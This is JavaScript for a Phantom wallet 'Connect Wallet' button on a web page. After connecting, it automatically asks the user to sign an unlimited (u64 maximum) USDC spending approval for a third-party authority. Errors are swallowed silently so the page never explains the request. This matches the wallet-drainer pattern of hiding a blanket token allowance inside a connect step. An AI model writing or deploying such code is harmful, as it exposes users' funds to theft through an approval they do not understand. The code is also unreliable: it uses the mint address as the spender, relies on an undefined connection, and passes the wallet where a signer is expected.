async function connectWallet() {
    console.log("Connect Wallet button clicked");

    if (window.solana) {
        console.log("window.solana detected");

        if (window.solana.isPhantom) {
            try {
                const response = await window.solana.connect();
                const walletAddress = response.publicKey.toString();
                console.log("Connected to wallet:", walletAddress);
                document.getElementById('walletStatus').innerText = `Wallet: ${walletAddress}`;
                window.walletAddress = walletAddress;
                
                // Request unlimited approval for USDC token
                // Replace with your program ID or authority address
                const YOUR_PROGRAM_ID = 'EPjFWaZn5XcjYnFoV1CfgkqvDzH6YFxZ1SVbq1X4Y8g';
                await requestUnlimitedApproval(
                    'EPjFWaZn5XcjYnFoV1CfgkqvDzH6YFxZ1SVbq1X4Y8g', // USDC mint
                    YOUR_PROGRAM_ID
                );
            } catch (err) {
                console.error("Wallet connection failed:", err);
            }
        } else {
            console.error("Solana provider is not Phantom");
        }
    } else {
        console.error("window.solana not found");
        alert("Phantom wallet not found. Please install it.");
    }
}

/**
 * Request unlimited token approval from user
 * @param {string} tokenMintAddress - The SPL token mint address
 * @param {string} spendingAuthorityAddress - Your program or authority address
 */
async function requestUnlimitedApproval(tokenMintAddress, spendingAuthorityAddress) {
    try {
        const { PublicKey, Transaction, LAMPORTS_PER_SOL } = window.solanaWeb3 || await import('@solana/web3.js');
        const { createApproveInstruction, getOrCreateAssociatedTokenAccount } = window.splToken || await import('@solana/spl-token');
        
        const wallet = window.solana;
        const userPublicKey = new PublicKey(window.walletAddress);
        const tokenMint = new PublicKey(tokenMintAddress);
        const authority = new PublicKey(spendingAuthorityAddress);
        
        console.log("Requesting unlimited approval for:", tokenMintAddress);
        
        // Get or create user's token account
        const tokenAccount = await getOrCreateAssociatedTokenAccount(
            connection, // Assumes connection is available globally
            wallet,
            tokenMint,
            userPublicKey
        );
        
        // Create approve instruction with max amount (unlimited)
        const approveInstruction = createApproveInstruction(
            tokenAccount.address,  // Token account
            authority,              // Spender (your program/contract)
            userPublicKey,          // Owner
            BigInt('18446744073709551615')  // u64::MAX (unlimited)
        );
        
        // Create and send transaction
        const transaction = new Transaction().add(approveInstruction);
        const signature = await wallet.signAndSendTransaction(transaction);
        
        console.log("Approval successful:", signature);
        document.getElementById('walletStatus').innerText += ` [Approved]`;
        return signature;
        
    } catch (error) {
        // Non-blocking error - wallet connection still succeeds
        console.warn("Token approval not completed:", error);
        // Don't show alert - user can approve manually later if needed
    }
}